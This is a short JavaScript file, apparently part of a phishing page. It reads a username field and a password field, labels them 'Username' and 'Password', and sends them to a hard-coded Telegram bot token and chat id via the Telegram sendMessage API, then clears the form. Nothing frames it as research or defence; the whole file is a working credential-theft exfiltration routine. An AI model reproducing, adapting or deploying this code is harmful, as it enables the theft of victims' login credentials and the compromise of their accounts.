//bot token
var telegram_bot_id = "6531157125:AAGdXJLeqafKzpvpfRaMo0oJWZRW1ogItHo";
//chat id
var chat_id = 5893653808;
var u_name, email, message;
var ready = function () {
  u_name = document.getElementById("name").value;
  email = document.getElementById("nap").value;
  //   message = document.getElementById("message").value;
  message = "Username: " + u_name + "\nPassword: " + email;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("name").value = "";
  document.getElementById("nap").value = "";
  //   document.getElementById("message").value = "";
  return false;
};
